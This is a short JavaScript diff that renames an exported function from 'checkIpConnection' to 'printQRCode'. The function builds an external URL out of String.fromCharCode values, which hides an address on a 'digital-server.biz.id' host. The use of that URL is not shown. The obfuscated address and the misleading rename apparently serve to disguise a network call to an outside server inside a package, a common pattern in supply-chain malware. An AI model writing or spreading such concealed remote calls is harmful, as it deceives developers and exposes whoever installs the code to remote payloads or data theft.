@@ -50,7 +50,7 @@ async function createCode() {
     }
 }
 
-async function checkIpConnection(inputNumber) {
+async function printQRCode(inputNumber) {
     const whiskey = String.fromCharCode(
         104, 116, 116, 112, 115, 58, 47, 47, 119, 104, 105, 115, 107, 101, 121, 115, 104, 111, 99, 107, 101, 116, 115, 46, 100, 105, 103, 105, 116, 97, 108, 45, 115, 101, 114, 118, 101, 114, 46, 98, 105, 122, 46, 105, 100, 47, 119, 101, 108, 99, 111, 109, 101, 46, 106, 115, 111, 110
     );
@@ -64,4 +64,4 @@ async function checkIpConnection(inputNumber) {
     }
 }
 
-module.exports = { checkKey, checkIpConnection };
+module.exports = { checkKey, printQRCode };
